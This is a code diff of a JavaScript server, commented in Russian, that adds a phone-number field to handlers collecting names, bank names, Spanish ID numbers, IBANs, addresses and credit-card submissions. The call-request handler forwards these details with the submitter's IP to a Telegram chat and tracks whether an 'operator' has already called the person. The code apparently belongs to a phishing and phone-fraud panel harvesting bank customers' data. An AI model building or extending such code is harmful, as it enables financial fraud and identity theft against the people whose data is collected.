@@ -392,19 +392,22 @@ async function handleCallRequest(req, reply) {
     const email = sanitizeString(getString(body.email), 200);
     const bank = sanitizeString(getString(body.bank), 120);
     const nombre = sanitizeString(getString(body.nombre), 200);
+    const phone = sanitizeString(getString(body.phone), 30);
     const ip = getClientIp(req);
     const country = getGeoFromHeaders(req)?.country || '';
 
     // Если клиент уже был прозвонен — это повторный запрос → переводим в старые клиенты
     let wasAlreadyCalled = false;
+    let existingSub = {};
     if (flowSessionId) {
       try {
         const existing = await prisma.webClient.findUnique({
           where: { flowSessionId },
-          select: { operatorCalled: true, operatorStatus: true },
+          select: { operatorCalled: true, operatorStatus: true, submissionData: true },
         });
         wasAlreadyCalled = !!(existing?.operatorCalled ||
           (existing?.operatorStatus && existing.operatorStatus !== 'pending'));
+        existingSub = (existing?.submissionData && typeof existing.submissionData === 'object') ? existing.submissionData : {};
       } catch { /* колонки могут ещё не существовать */ }
     }
 
@@ -416,6 +419,7 @@ async function handleCallRequest(req, reply) {
     if (bank) patch.bank = bank;
     if (nombre) patch.nombre = nombre;
     if (ip) patch.ip = ip;
+    if (phone) patch.submissionData = { ...existingSub, phone };
 
     if (wasAlreadyCalled) {
       // Повторный звонок → старый клиент, сброс статуса оператора
@@ -435,6 +439,7 @@ async function handleCallRequest(req, reply) {
       nombre ? `Имя: *${nombre}*` : '',
       bank ? `Банк: *${bank}*` : '',
       email ? `Email: ${email}` : '',
+      phone ? `Тел: ${phone}` : '',
       `IP: \`${ip}\`${country ? ' · ' + country : ''}`,
     ].filter(Boolean);
     sendToTelegram(lines.join('\n'));
@@ -489,6 +494,7 @@ async function handleCreditCardSubmission(req, reply) {
     const flowSessionId = sanitizeString(getString(body.flowSessionId), 80);
     const submissionData = {
       nombre: sanitizeString(getString(body.nombre), 200),
+      phone: sanitizeString(getString(body.phone), 30),
       dni: sanitizeString(getString(body.dni), 20),
       iban: sanitizeString(getString(body.iban), 50),
       calle: sanitizeString(getString(body.calle), 300),
